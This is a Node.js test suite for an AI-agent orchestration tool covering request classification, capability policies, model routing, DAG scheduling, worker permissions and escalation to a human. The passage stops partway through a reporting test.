import { strict as assert } from "node:assert"
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { join } from "node:path"
import { after, describe, it } from "node:test"

import { CAAO_HOME, allCapabilities, capability, clearCache, loadConfig, validateConfig } from "../.opencode/caao/config.js"
import { classify, detectDomains, normalizeTriage } from "../.opencode/caao/classify.js"
import { evaluate, matchesGlob, matchesKeyword } from "../.opencode/caao/match.js"
import { evaluatePost, resolveCapabilities, selectStrategy } from "../.opencode/caao/policy.js"
import { poolsFor, providerTable, resolveProvider } from "../.opencode/caao/provider.js"
import { buildGraph, expandNode, isComplete, readyNodes, resetDownstream, toMermaid, waves } from "../.opencode/caao/dag.js"
import { ORCHESTRATION_TOOLS, detectDrift, renderAgents } from "../.opencode/caao/agents.js"
import { expand, ingestUsage, merge, next, plan, record, recordContextSavings, report, status } from "../.opencode/caao/engine.js"
import { budgetState, budgets, costOf, currency, priceTable, sum, usageOf } from "../.opencode/caao/pricing.js"
import { byCapability, byContextTool, byModel, daily, overview, repositories, summarize } from "../.opencode/caao/analytics.js"
import { addUsage, attributionTarget, observationFrom, poolForModel, subtractUsage } from "../.opencode/caao/usage.js"
import { extractSavings, ownerOf, toolBelongsTo } from "../.opencode/caao/savings.js"
import { diagnose, formatDiagnostics, resolveExecutable } from "../.opencode/caao/doctor.js"
import { counterfactuals, explain } from "../.opencode/caao/rationale.js"
import { catalog, manifestFor, matchesScope, mcpBlock, skillInstructionsFor, validateCatalog } from "../.opencode/caao/catalog.js"
import {
  MANAGED_FILES,
  applyBundle,
  buildBundle,
  bundleVersion,
  generateSigningKeys,
  rollbackBundle,
  signBundle,
  verifyBundle,
} from "../.opencode/caao/distribution.js"
import { distributionSettings } from "../.opencode/caao/update.js"
import { repoSlug } from "../.opencode/caao/context.js"
import { syncCatalog } from "../.opencode/caao/catalog-sync.js"
import { runPath, withRunLock } from "../.opencode/caao/state.js"

const config = loadConfig()
const created = []

function orchestrate(request, overrides = {}) {
  const signals = classify(config, { request, changedFiles: [], ...overrides })
  const { capabilities, trace } = resolveCapabilities(config, signals)
  const strategy = selectStrategy(config, { ...signals, capabilities, capability_count: capabilities.length })
  return { signals, capabilities, trace, strategy }
}

function run(request, extra = {}) {
  const created_run = plan({ request, skipRepoScan: true, changedFiles: [], ...extra })
  created.push(created_run.id)
  return created_run
}

after(() => {
  for (const id of created) {
    const path = runPath(id)
    if (existsSync(path)) rmSync(path)
  }
})

// ---------------------------------------------------------------------------

describe("configuration", () => {
  it("loads and validates every declarative file", () => {
    assert.ok(config.capabilities.capabilities)
    assert.ok(config.providers.pools)
    assert.ok(config.policies.base)
    assert.ok(config.workflows.strategies)
  })

  it("keeps provider credentials outside the shared runtime configuration", () => {
    const runtime = JSON.parse(readFileSync(join(CAAO_HOME, "opencode.json"), "utf8"))
    assert.match(runtime.provider.omniroute.options.apiKey, /^\{env:[A-Z0-9_]+\}$/)
  })

  it("gives every capability a phase, a provider binding and a worker contract", () => {
    for (const cap of allCapabilities(config)) {
      assert.ok(cap.phase, `${cap.id} has no phase`)
      assert.ok(Number.isInteger(cap.phaseRank), `${cap.id} has no phase rank`)
      assert.ok(config.providers.bindings[cap.id], `${cap.id} has no provider binding`)
      assert.ok(cap.worker?.output_contract, `${cap.id} has no output contract`)
    }
  })

  it("keeps capabilities free of any provider or model reference", () => {
    const raw = JSON.stringify(config.capabilities)
    for (const pool of Object.values(config.providers.pools)) {
      assert.equal(raw.includes(pool.model), false, `capabilities.yaml leaks model ${pool.model}`)
    }
    assert.equal(raw.includes("omniroute"), false)
  })

  it("keeps policies free of any provider or model reference", () => {
    const raw = JSON.stringify(config.policies)
    for (const pool of Object.values(config.providers.pools)) {
      assert.equal(raw.includes(pool.model), false)
    }
  })

  it("rejects an invalid configuration", () => {
    clearCache()
    assert.throws(() => loadConfig("./tests/fixtures/broken"), /CAAO configuration is invalid|cannot load/)
    clearCache()
    loadConfig()
  })

  it("rejects capability chaining to an unknown capability", () => {
    const invalid = structuredClone(config)
    invalid.capabilities.capabilities.planning.may_request = ["missing"]
    assert.throws(() => validateConfig(invalid), /planning" may_request unknown capability "missing"/)
  })
})

describe("matcher", () => {
  it("matches keywords on word boundaries", () => {
    assert.equal(matchesKeyword("implement oauth login", "oauth"), true)
    assert.equal(matchesKeyword("rapid prototyping", "api"), false)
    assert.equal(matchesKeyword("this is a slow query problem", "slow query"), true)
  })

  it("matches globs", () => {
    assert.equal(matchesGlob("src/auth/token.ts", "**/auth/**"), true)
    assert.equal(matchesGlob("src/api/routes.ts", "**/auth/**"), false)
    assert.equal(matchesGlob("infra/main.tf", "**/*.tf"), true)
  })

  it("supports any / all / not composition", () => {
    const signals = { complexity: "high", changed_files: 30, text: "implement oauth" }
    assert.equal(evaluate({ complexity: ["high"] }, signals), true)
    assert.equal(evaluate({ any: { complexity: ["trivial"], changed_files: { gt: 20 } } }, signals), true)
    assert.equal(evaluate({ all: { complexity: ["high"], changed_files: { gt: 100 } } }, signals), false)
    assert.equal(evaluate({ not: { complexity: ["high"] } }, signals), false)
  })
})

describe("classification", () => {
  const cases = [
    ["Rename variable foo", "rename", "trivial"],
    ["Fix failing unit tests", "debug", "medium"],
    ["Implement OAuth", "implement", "high"],
    ["Refactor monolith", "refactor", "critical"],
    ["Generate API documentation", "document", "medium"],
    ["Optimize SQL queries", "optimize", "medium"],
  ]

  for (const [request, intent, complexity] of cases) {
    it(`classifies "${request}" as ${intent}/${complexity}`, () => {
      const signals = classify(config, { request })
      assert.equal(signals.intent, intent)
      assert.equal(signals.complexity, complexity)
    })
  }

  it("detects domains from the request text", () => {
    assert.deepEqual(detectDomains(config, { text: "implement oauth login" }).map((d) => d.id), ["auth"])
    assert.ok(detectDomains(config, { text: "refund a stripe checkout" }).some((d) => d.id === "payments"))
  })

  it("detects domains from changed file paths", () => {
    const domains = detectDomains(config, { text: "small change", files: ["src/auth/session.ts", "infra/main.tf"] })
    const ids = domains.map((d) => d.id)
    assert.ok(ids.includes("auth"))
    assert.ok(ids.includes("infrastructure"))
  })

  it("accepts explicit overrides and records them as evidence", () => {
    const signals = classify(config, { request: "Rename variable foo", complexity: "critical" })
    assert.equal(signals.complexity, "critical")
    assert.equal(signals.evidence.complexity.overridden, true)
  })
})

describe("policy engine — the six reference scenarios", () => {
  it("Example 1: a rename skips planning and review", () => {
    const { capabilities, strategy } = orchestrate("Rename variable foo")
    assert.deepEqual(capabilities, ["implementation"])
    assert.equal(strategy.id, "direct")
  })

  it("Example 2: a defect pulls in testing but not review", () => {
    const { capabilities } = orchestrate("Fix failing unit tests")
    assert.deepEqual(capabilities, ["implementation", "testing"])
  })

  it("Example 3: OAuth pulls in planning, review, security and proof", () => {
    const { capabilities, trace } = orchestrate("Implement OAuth")
    assert.deepEqual(capabilities, ["planning", "implementation", "review", "security", "testing"])
    assert.equal(trace.find((entry) => entry.policy === "touches-auth")?.stage, "augment")
  })

  it("Example 4: a monolith refactor triggers architecture and performance review", () => {
    const { capabilities, strategy } = orchestrate("Refactor monolith")
    assert.deepEqual(capabilities, ["planning", "refactoring", "architecture", "performance"])
    assert.equal(strategy.id, "swarm")
  })

  it("Example 5: documentation only", () => {
    const { capabilities, strategy } = orchestrate("Generate API documentation")
    assert.deepEqual(capabilities, ["documentation"])
    assert.equal(strategy.id, "direct")
  })

  it("Example 6: SQL optimization plans, implements and reviews performance", () => {
    const { capabilities } = orchestrate("Optimize SQL queries")
    assert.deepEqual(capabilities, ["planning", "implementation", "performance"])
  })
})

describe("context policies", () => {
  it("auth enables security review", () => {
    const { capabilities } = orchestrate("Update the login session handling")
    assert.ok(capabilities.includes("security"))
  })

  it("payments enables security and architecture review", () => {
    const { capabilities } = orchestrate("Adjust the invoice billing rules")
    assert.ok(capabilities.includes("security"))
    assert.ok(capabilities.includes("architecture"))
  })

  it("more than 20 changed files enables architecture review", () => {
    const { capabilities } = orchestrate("Tidy the helpers", { changedFiles: Array.from({ length: 25 }, (_, i) => `src/mod${i}.ts`) })
    assert.ok(capabilities.includes("architecture"))
  })

  it("a migration always drags testing along", () => {
    const { capabilities } = orchestrate("Add a database migration for the users table")
    assert.deepEqual(capabilities.slice(0, 3), ["planning", "migration", "review"])
    assert.ok(capabilities.includes("testing"))
  })

  it("policies compose additively and every addition is traceable", () => {
    const { trace } = orchestrate("Implement OAuth")
    assert.equal(trace[0].stage, "base")
    assert.ok(trace.slice(1).every((entry) => entry.stage === "augment"))
    assert.ok(trace.every((entry) => typeof entry.reason === "string" && entry.reason.length > 0))
  })

  it("low confidence enables the advisor", () => {
    const post = evaluatePost(config, { confidence: 0.42 })
    assert.deepEqual(post.capabilities, ["advisor"])
    assert.equal(post.escalate, false)
  })

  it("collapsed confidence escalates to the human", () => {
    const post = evaluatePost(config, { confidence: 0.3 })
    assert.deepEqual(post.capabilities, ["advisor"])
    assert.equal(post.escalate, true)
  })

  it("high confidence enables nothing", () => {
    assert.deepEqual(evaluatePost(config, { confidence: 0.97 }).capabilities, [])
  })

  it("blocking review findings reopen the build phase", () => {
    assert.deepEqual(evaluatePost(config, { confidence: 0.9, findings_blocking: 2 }).capabilities, ["implementation"])
  })
})

describe("provider resolution", () => {
  it("resolves planning to the highest reasoning pool and implementation to the fastest", () => {
    assert.equal(resolveProvider(config, "planning").pool, "opus-5")
    assert.equal(resolveProvider(config, "implementation").pool, "kimi-code")
  })

  it("resolves documentation to the cheapest pool", () => {
    assert.equal(resolveProvider(config, "documentation").pool, "kimi-code")
  })

  it("exposes an ordered fallback chain and advances it per attempt", () => {
    const first = resolveProvider(config, "implementation", { attempt: 0 })
    const second = resolveProvider(config, "implementation", { attempt: 1 })
    assert.deepEqual(first.fallbacks, ["opus-5"])
    assert.notEqual(first.model, second.model)
    assert.equal(second.exhausted, true)
  })

  it("never leaks a provider decision into the capability registry", () => {
    for (const row of providerTable(config)) {
      assert.equal(capability(config, row.capability).model, undefined)
    }
  })

  it("re-binding a capability changes nothing but the model", () => {
    const rebound = structuredClone(config)
    rebound.providers.bindings.implementation.candidates = ["opus-5"]
    assert.equal(resolveProvider(rebound, "implementation").model, "omniroute/github/claude-opus-5")
    assert.equal(resolveProvider(config, "implementation").model, "omniroute/github/kimi-k2.7-code")
  })
})

describe("workflow builder", () => {
  it("selects direct for a single capability", () => {
    assert.equal(selectStrategy(config, { capability_count: 1, complexity: "trivial" }).id, "direct")
  })

  it("selects swarm for critical work", () => {
    assert.equal(selectStrategy(config, { capability_count: 3, complexity: "critical" }).id, "swarm")
  })

  it("selects dag by default", () => {
    assert.equal(selectStrategy(config, { capability_count: 2, complexity: "medium" }).id, "dag")
  })

  it("layers the graph by phase and never produces a cycle", () => {
    const { capabilities, strategy } = orchestrate("Implement OAuth")
    const graph = buildGraph(config, { capabilities, strategy })
    const seen = new Set()
    for (const node of graph.nodes) {
      for (const dep of node.dependsOn) assert.ok(seen.has(dep), `${node.id} depends on unseen ${dep}`)
      seen.add(node.id)
    }
  })

  it("runs independent validation capabilities as parallel siblings", () => {
    const { capabilities, strategy } = orchestrate("Implement OAuth")
    const graph = buildGraph(config, { capabilities, strategy })
    const review = graph.nodes.find((node) => node.id === "review")
    const security = graph.nodes.find((node) => node.id === "security")
    assert.deepEqual(review.dependsOn, security.dependsOn)
    assert.equal(review.layer, security.layer)
  })

  it("serializes non-parallelizable capabilities ahead of their siblings", () => {
    const { capabilities, strategy } = orchestrate("Add a database migration for the users table")
    const graph = buildGraph(config, { capabilities, strategy })
    const migration = graph.nodes.find((node) => node.capability === "migration")
    assert.equal(migration.parallelizable, false)
    assert.equal(graph.layers[migration.layer].length, 1)
  })

  it("marks build nodes expandable only when planning is present", () => {
    const withPlan = buildGraph(config, { ...orchestrate("Implement OAuth") })
    assert.equal(withPlan.nodes.find((n) => n.id === "implementation").expandable, true)

    const noPlan = buildGraph(config, { ...orchestrate("Fix failing unit tests") })
    assert.equal(noPlan.nodes.find((n) => n.id === "implementation").expandable, undefined)
  })

  it("renders a mermaid graph", () => {
    const graph = buildGraph(config, { ...orchestrate("Implement OAuth") })
    const mermaid = toMermaid(graph)
    assert.match(mermaid, /^flowchart TD/)
    assert.match(mermaid, /planning\[".*"\] --> implementation/)
  })
})

describe("DAG execution", () => {
  it("only releases nodes whose dependencies are satisfied", () => {
    const graph = buildGraph(config, { ...orchestrate("Implement OAuth") })
    assert.deepEqual(readyNodes(graph).map((n) => n.id), ["planning"])

    graph.nodes.find((n) => n.id === "planning").status = "done"
    assert.deepEqual(readyNodes(graph).map((n) => n.id), ["implementation"])
  })

  it("expands a planning fan-out into parallel workers and rewires downstream nodes", () => {
    const graph = buildGraph(config, { ...orchestrate("Implement OAuth") })
    graph.nodes.find((n) => n.id === "planning").status = "done"

    const children = expandNode(
      graph,
      "implementation",
      [
        { id: "db", title: "Token storage" },
        { id: "backend", title: "OAuth backend", depends_on: ["db"] },
        { id: "frontend", title: "Login UI", depends_on: ["db"] },
      ],
      config,
    )

    assert.equal(children.length, 3)
    assert.equal(graph.nodes.find((n) => n.id === "implementation").status, "expanded")
    assert.deepEqual(children[1].dependsOn, ["implementation:db"])

    const testing = graph.nodes.find((n) => n.id === "testing")
    assert.deepEqual(testing.dependsOn, ["implementation:db", "implementation:backend", "implementation:frontend"])

    assert.deepEqual(readyNodes(graph).map((n) => n.id), ["implementation:db"])
  })

  it("refuses to expand a node the strategy did not open", () => {
    const graph = buildGraph(config, { ...orchestrate("Fix failing unit tests") })
    assert.throws(() => expandNode(graph, "implementation", [{ title: "x" }], config), /not expandable/)
  })

  it("rejects dangling dependencies instead of treating them as completed", () => {
    const graph = buildGraph(config, { ...orchestrate("Implement OAuth") })
    graph.nodes[0].dependsOn.push("missing-node")
    assert.throws(() => readyNodes(graph), /unknown dependencies/)
  })

  it("rejects invalid or cyclic expansion dependencies before mutating the graph", () => {
    const graph = buildGraph(config, { ...orchestrate("Implement OAuth") })
    assert.throws(
      () => expandNode(graph, "implementation", [{ id: "api", depends_on: ["missing"] }], config),
      /unknown subtask/,
    )
    assert.throws(
      () => expandNode(graph, "implementation", [{ id: "a", depends_on: ["b"] }, { id: "b", depends_on: ["a"] }], config),
      /dependency cycle/,
    )
    assert.equal(graph.nodes.find((node) => node.id === "implementation").status, "pending")
  })

  it("reports completion only when every node reached a terminal state", () => {
    const graph = buildGraph(config, { ...orchestrate("Generate API documentation") })
    assert.equal(isComplete(graph), false)
    graph.nodes.forEach((node) => (node.status = "done"))
    assert.equal(isComplete(graph), true)
  })
})

describe("agent synthesis", () => {
  const rendered = renderAgents(config)

  it("generates one worker per capability/pool combination plus the two entry points", () => {
    const variants = allCapabilities(config).reduce((sum, cap) => sum + poolsFor(config, cap.id).length, 0)
    assert.equal(rendered.length, variants + 2)
    assert.ok(rendered.some((agent) => agent.file === "caao.md"))
    assert.ok(rendered.some((agent) => agent.file === "build.md"))
  })

  it("gives every alternate pool its own agent so runtime escalation is real", () => {
    const escalated = resolveProvider(config, "implementation", { signals: { complexity: "critical" } })
    assert.notEqual(escalated.pool, resolveProvider(config, "implementation").pool)
    assert.equal(escalated.agent, `caao-implementation--${escalated.pool}`)
    const agent = rendered.find((candidate) => candidate.file === `${escalated.agent}.md`)
    assert.ok(agent, "the escalated agent must exist on disk")
    assert.match(agent.content, new RegExp(`^model: ${escalated.model}$`, "m"))
  })

  it("binds every worker to the model resolved from providers.yaml", () => {
    for (const cap of allCapabilities(config)) {
      const agent = rendered.find((candidate) => candidate.file === `caao-${cap.id}.md`)
      assert.match(agent.content, new RegExp(`^model: ${resolveProvider(config, cap.id).model}$`, "m"))
    }
  })

  it("denies orchestration tools to every worker", () => {
    for (const cap of allCapabilities(config)) {
      const agent = rendered.find((candidate) => candidate.file === `caao-${cap.id}.md`)
      for (const toolName of ORCHESTRATION_TOOLS) {
        assert.match(agent.content, new RegExp(`^  ${toolName}: false$`, "m"), `${cap.id} may call ${toolName}`)
      }
      assert.match(agent.content, /^ {2}task: false$/m)
    }
  })

  it("gives write access only to mutating capabilities", () => {
    for (const cap of allCapabilities(config)) {
      const agent = rendered.find((candidate) => candidate.file === `caao-${cap.id}.md`)
      assert.match(agent.content, new RegExp(`^ {2}edit: ${Boolean(cap.mutates)}$`, "m"), `${cap.id} edit permission is wrong`)
    }
  })

  it("never lets the Execution Manager touch files", () => {
    for (const file of ["caao.md", "build.md"]) {
      const agent = rendered.find((candidate) => candidate.file === file)
      assert.match(agent.content, /^ {2}edit: false$/m)
      assert.match(agent.content, /^ {2}write: false$/m)
      assert.match(agent.content, /^mode: primary$/m)
    }
  })

  it("has no drift between the YAML registries and the generated agents", () => {
    const drift = detectDrift(config)
    assert.deepEqual(drift.map((agent) => agent.file), [], "run: npm run caao:sync")
  })
})

describe("engine runtime", () => {
  it("serializes state transitions for the same run", () => {
    const created_run = run("Rename a variable")
    withRunLock(created_run.id, () => {
      assert.throws(() => withRunLock(created_run.id, () => null), /is busy/)
    })
    assert.doesNotThrow(() => withRunLock(created_run.id, () => null), "the lock must be released after the transition")
  })

  it("dispatches ready nodes with a self-contained worker brief", () => {
    const created_run = run("Implement OAuth")
    const dispatch = next(created_run.id)

    assert.equal(dispatch.dispatch.length, 1)
    const [first] = dispatch.dispatch
    assert.equal(first.agent, "caao-planning")
    assert.equal(first.model, "omniroute/github/claude-opus-5")
    assert.match(first.prompt, /Implement OAuth/)
    assert.match(first.prompt, /CONFIDENCE: <0\.00-1\.00>/)
  })

  it("respects the parallelism budget of the strategy", () => {
    const created_run = run("Implement OAuth")
    next(created_run.id)
    record(created_run.id, "planning", { status: "ok", confidence: 0.9, summary: "plan ready" })
    expand(created_run.id, "implementation", [
      { id: "a", title: "Backend" },
      { id: "b", title: "Frontend" },
    ])

    const dispatch = next(created_run.id)
    assert.deepEqual(dispatch.dispatch.map((d) => d.nodeId), ["implementation:a", "implementation:b"])
  })

  it("passes upstream summaries down the graph", () => {
    const created_run = run("Fix failing unit tests")
    next(created_run.id)
    record(created_run.id, "implementation", { status: "ok", confidence: 0.9, summary: "patched the parser", files: ["src/parser.ts"] })
    const dispatch = next(created_run.id)
    assert.match(dispatch.dispatch[0].prompt, /patched the parser/)
  })

  it("retries on the same provider, then switches provider, then escalates", () => {
    const created_run = run("Fix failing unit tests")
    next(created_run.id)

    const first = record(created_run.id, "implementation", { status: "error" })
    assert.equal(first.decisions[0].action, "retry_same_provider")

    next(created_run.id)
    const second = record(created_run.id, "implementation", { status: "error" })
    assert.equal(second.decisions[0].action, "switch_provider")
    assert.equal(second.decisions[0].model, "omniroute/github/claude-opus-5")

    next(created_run.id)
    const third = record(created_run.id, "implementation", { status: "error" })
    assert.equal(third.decisions[0].action, "escalate")

    const state = status(created_run.id)
    assert.ok(state.nodes.some((node) => node.capability === "advisor"))
    assert.equal(state.nodes.find((node) => node.id === "implementation").status, "blocked")
  })

  it("treats confidence below the capability floor as a failure", () => {
    const created_run = run("Fix failing unit tests")
    next(created_run.id)
    const result = record(created_run.id, "implementation", { status: "ok", confidence: 0.3, summary: "not sure" })
    assert.equal(result.decisions[0].action, "retry_same_provider")
    assert.match(result.decisions[0].reason, /below floor/)
  })

  it("lets the advisor unblock a node by switching provider", () => {
    const created_run = run("Fix failing unit tests")
    next(created_run.id)
    record(created_run.id, "implementation", { status: "error" })
    next(created_run.id)
    record(created_run.id, "implementation", { status: "error" })
    next(created_run.id)
    record(created_run.id, "implementation", { status: "error" })

    const advisor = status(created_run.id).nodes.find((node) => node.capability === "advisor")
    record(created_run.id, advisor.id, { status: "ok", confidence: 0.8, decision: "switch_provider" })

    const state = status(created_run.id)
    assert.equal(state.nodes.find((node) => node.id === "implementation").status, "pending")
  })

  it("reopens the build phase when a blocking gate fails", () => {
    const created_run = run("Implement OAuth")
    next(created_run.id)
    record(created_run.id, "planning", { status: "ok", confidence: 0.9, summary: "plan" })
    next(created_run.id)
    record(created_run.id, "implementation", { status: "ok", confidence: 0.9, summary: "done", files: ["src/auth/oauth.ts"] })
    next(created_run.id)
    record(created_run.id, "testing", { status: "ok", confidence: 0.9, summary: "green" })
    next(created_run.id)

    const verdict = record(created_run.id, "security", {
      status: "ok",
      confidence: 0.9,
      verdict: "fail",
      findings_blocking: 1,
      summary: "token stored in localStorage",
    })

    assert.ok(verdict.decisions.some((decision) => decision.action === "reopen_build"))
    assert.equal(status(created_run.id).nodes.find((node) => node.id === "implementation").status, "pending")
  })

  it("honours capability chaining requested by a worker", () => {
    const created_run = run("Fix failing unit tests")
    next(created_run.id)
    const result = record(created_run.id, "implementation", {
      status: "ok",
      confidence: 0.9,
      summary: "fixed",
      request_capabilities: ["documentation"],
    })
    assert.ok(result.decisions.some((decision) => decision.action === "capability_chained"))
    assert.ok(status(created_run.id).capabilities.includes("documentation"))
  })

  it("merges contributions and detects conflicting files", () => {
    const created_run = run("Implement OAuth")
    next(created_run.id)
    record(created_run.id, "planning", { status: "ok", confidence: 0.9, summary: "plan" })
    expand(created_run.id, "implementation", [
      { id: "a", title: "Backend" },
      { id: "b", title: "Frontend" },
    ])
    next(created_run.id)
    record(created_run.id, "implementation:a", { status: "ok", confidence: 0.9, summary: "backend", files: ["src/auth/oauth.ts", "src/auth/token.ts"] })
    record(created_run.id, "implementation:b", { status: "ok", confidence: 0.9, summary: "frontend", files: ["src/auth/oauth.ts"] })

    const report = merge(created_run.id)
    assert.equal(report.unified, false)
    assert.deepEqual(report.conflicts[0].nodes, ["implementation:a", "implementation:b"])
    assert.ok(report.pendingGates.some((gate) => gate.capability === "security" && gate.blocking))
  })

  it("keeps a full decision log for the run", () => {
    const created_run = run("Generate API documentation")
    next(created_run.id)
    record(created_run.id, "documentation", { status: "ok", confidence: 0.9, summary: "docs written", files: ["README.md"] })

    const state = status(created_run.id)
    assert.equal(state.status, "complete")
    assert.deepEqual(state.log.map((entry) => entry.event), ["planned", "dispatch", "recorded"])
  })
})

// ---------------------------------------------------------------------------

describe("semantic classification", () => {
  const triage = (overrides) => ({
    intent: "implement",
    complexity: "medium",
    domains: [],
    rationale: "",
    confidence: 0.9,
    ...overrides,
  })

  it("parses a triage verdict wrapped in prose or a fenced block", () => {
    const parsed = normalizeTriage('Here it is:\n```json\n{"intent":"debug","complexity":"high","domains":["auth"],"confidence":0.82}\n```')
    assert.equal(parsed.intent, "debug")
    assert.equal(parsed.complexity, "high")
    assert.deepEqual(parsed.domains, ["auth"])
    assert.equal(parsed.confidence, 0.82)
  })

  it("clamps a malformed confidence instead of trusting it", () => {
    assert.equal(normalizeTriage({ confidence: 7 }).confidence, 1)
    assert.equal(normalizeTriage({ confidence: "nonsense" }).confidence, 0)
    assert.equal(normalizeTriage("not json at all"), null)
  })

  it("falls back to keywords when no verdict is supplied", () => {
    const signals = classify(config, { request: "Fix the failing tests" })
    assert.equal(signals.understanding, "keywords-only")
    assert.equal(signals.classification_confidence, null)
    assert.equal(signals.evidence.semantic.source, "keywords")
  })

  it("adopts the semantic verdict when the model is confident", () => {
    const signals = classify(config, {
      request: "Make the checkout stop losing orders",
      triage: triage({ intent: "debug", complexity: "high", confidence: 0.9 }),
    })
    assert.equal(signals.intent, "debug")
    assert.equal(signals.complexity, "high")
    assert.equal(signals.understanding, "confident")
    assert.equal(signals.evidence.semantic.source, "semantic")
  })

  it("understands a request that contains none of the keywords", () => {
    const keywordOnly = classify(config, { request: "The signup page lets anyone in without a password" })
    const semantic = classify(config, {
      request: "The signup page lets anyone in without a password",
      triage: triage({ intent: "debug", complexity: "high", domains: ["auth"], confidence: 0.88 }),
    })
    assert.notEqual(keywordOnly.intent, "debug")
    assert.equal(semantic.intent, "debug")
    assert.ok(semantic.touches.includes("auth"))
  })

  it("keeps the higher complexity of the two layers when only probable", () => {
    const signals = classify(config, {
      request: "Rewrite the entire codebase in another language",
      triage: triage({ intent: "refactor", complexity: "medium", confidence: 0.65 }),
    })
    assert.equal(signals.understanding, "probable")
    assert.equal(signals.complexity, "critical", "the keyword prior must not be silently lowered")
  })

  it("buys extra scrutiny when the model is unsure", () => {
    const signals = classify(config, {
      request: "Sort out the thing with the reports",
      triage: triage({ intent: "implement", complexity: "medium", confidence: 0.45 }),
    })
    assert.equal(signals.understanding, "uncertain")
    assert.equal(signals.complexity, "high")
    assert.equal(signals.evidence.semantic.raised, "+1")
  })

  it("discards a guessed verdict but still raises complexity", () => {
    const signals = classify(config, {
      request: "Sort out the thing with the reports",
      triage: triage({ intent: "migrate", complexity: "trivial", confidence: 0.2 }),
    })
    assert.equal(signals.understanding, "guessed")
    assert.equal(signals.intent, "implement", "a guessed intent is not adopted")
    assert.equal(signals.evidence.semantic.source, "keywords")
  })

  it("always unions the detected domains", () => {
    const signals = classify(config, {
      request: "Speed up the invoice export",
      triage: triage({ intent: "optimize", domains: ["database"], confidence: 0.9 }),
    })
    assert.ok(signals.touches.includes("payments"), "keyword domain kept")
    assert.ok(signals.touches.includes("database"), "semantic domain kept")
  })

  it("records disagreement between the two layers", () => {
    const signals = classify(config, {
      request: "Add a README section describing the new endpoint",
      triage: triage({ intent: "implement", complexity: "medium", confidence: 0.7 }),
    })
    assert.equal(signals.evidence.semantic.disagreement.keywords, "document")
    assert.equal(signals.evidence.semantic.disagreement.semantic, "implement")
  })

  it("plans more defensively when the request was not understood", () => {
    const { capabilities } = orchestrate("Sort out the thing with the reports", {
      triage: triage({ intent: "implement", complexity: "medium", confidence: 0.35 }),
    })
    assert.ok(capabilities.includes("planning"), "an unclear request is decomposed first")
    assert.ok(capabilities.includes("review"), "guessed work is never delivered unreviewed")
  })
})

describe("confidence-driven provider escalation", () => {
  it("uses the fast pool when the request is understood", () => {
    const provider = resolveProvider(config, "implementation", {
      signals: { understanding: "confident", complexity: "medium", touches: [] },
    })
    assert.equal(provider.tier, "standard")
    assert.equal(provider.escalated, false)
  })

  it("escalates to a heavy pool when understanding is poor", () => {
    const provider = resolveProvider(config, "implementation", {
      signals: { understanding: "uncertain", complexity: "medium", touches: [] },
    })
    assert.equal(provider.tier, "heavy")
    assert.equal(provider.escalated, true)
    assert.match(provider.escalationReason, /not understood confidently/)
  })

  it("escalates on blast radius even when understanding is perfect", () => {
    const provider = resolveProvider(config, "implementation", {
      signals: { understanding: "confident", complexity: "critical", touches: [] },
    })
    assert.equal(provider.tier, "heavy")
  })

  it("escalates on domain sensitivity", () => {
    const provider = resolveProvider(config, "implementation", {
      signals: { understanding: "confident", complexity: "medium", touches: ["crypto"] },
    })
    assert.equal(provider.tier, "heavy")
    assert.match(provider.escalationReason, /cryptographic/)
  })

  it("applies the first matching override only", () => {
    const provider = resolveProvider(config, "implementation", {
      signals: { understanding: "guessed", complexity: "critical", touches: ["crypto"] },
    })
    assert.match(provider.escalationReason, /not understood confidently/)
  })

  it("keeps the fallback chain usable after an escalation", () => {
    const provider = resolveProvider(config, "implementation", {
      signals: { understanding: "uncertain", complexity: "medium", touches: [] },
    })
    assert.ok(provider.fallbacks.length > 0)
    const next_attempt = resolveProvider(config, "implementation", {
      attempt: 1,
      signals: { understanding: "uncertain", complexity: "medium", touches: [] },
    })
    assert.notEqual(next_attempt.pool, provider.pool)
  })

  it("exposes every pool a capability can reach", () => {
    assert.deepEqual(poolsFor(config, "implementation").sort(), ["kimi-code", "opus-5"])
  })

  it("carries the escalation into the plan", () => {
    const created_run = run("Refactor the monolith into modular services")
    const refactoring = created_run.graph.nodes.find((node) => node.capability === "refactoring")
    assert.equal(refactoring.provider.tier, "heavy")
    assert.equal(refactoring.agent, "caao-refactoring--opus-5")
  })
})

describe("attribution recap", () => {
  it("reports which model executed which capability", () => {
    const created_run = run("Fix the failing unit tests in the billing module")
    next(created_run.id)
    record(created_run.id, "implementation", { status: "ok", confidence: 0.88, summary: "fixed", files: ["src/billing/invoice.ts"] })
    next(created_run.id)
    record(created_run.id, "testing", { status: "ok", confidence: 0.92, summary: "green" })

    const recap = report(created_run.id)
    const build = recap.steps.find((step) => step.capability === "implementation")
    assert.equal(build.model, "omniroute/github/kimi-k2.7-code")
    assert.equal(build.confidence, 0.88)
    assert.equal(build.attempts, 1)
    assert.deepEqual(build.files, ["src/billing/invoice.ts"])
  })

  it("groups the work by model", () => {
    const created_run = run("Fix the failing unit tests in the billing module")
    next(created_run.id)
    record(created_run.id, "implementation", { status: "ok", confidence: 0.9, summary: "fixed" })
    next(created_run.id)
    record(created_run.id, "testing", { status: "ok", confidence: 0.9, summary: "green" })

    const recap = report(created_run.id)
    const fast = recap.models.find((entry) => entry.model === "omniroute/github/kimi-k2.7-code")
    assert.equal(fast.steps, 2)
    assert.deepEqual(fast.capabilities.sort(), ["implementation", "testing"])
  })

  it("explains why every capability was selected", () => {
    const created_run = run("Fix the failing unit tests in the billing module")
    const recap = report(created_run.id)
    const security = recap.why.find((entry) => entry.added.includes("security"))
    assert.equal(security.policy, "touches-payments")
    assert.match(security.reason, /money-handling/)
  })

  it("records a provider switch as an escalation", () => {
    const created_run = run("Fix the failing unit tests in the billing module")
    next(created_run.id)
    record(created_run.id, "implementation", { status: "error" })
    next(created_run.id)
    record(created_run.id, "implementation", { status: "error" })
    next(created_run.id)
    record(created_run.id, "implementation", { status: "ok", confidence: 0.9, summary: "fixed at last" })

    const recap = report(created_run.id)
    const build = recap.steps.find((step) => step.capability === "implementation")
    assert.equal(build.attempts, 3)
    assert.equal(build.model, "omniroute/github/claude-opus-5")
    assert.equal(build.switchedFrom, "omniroute/github/kimi-k2.7-code")
    assert.ok(recap.escalations.some((step) => step.capability === "implementation"))
  })

  it("surfaces how the request was understood", () => {
    const created_run = run("Sort out the thing with the reports", {
      triage: { intent: "implement", complexity: "medium", domains: [], rationale: "unclear scope", confidence: 0.35 },
    })
    const recap = report(created_run.id)
    assert.equal(recap.understanding.band, "guessed")
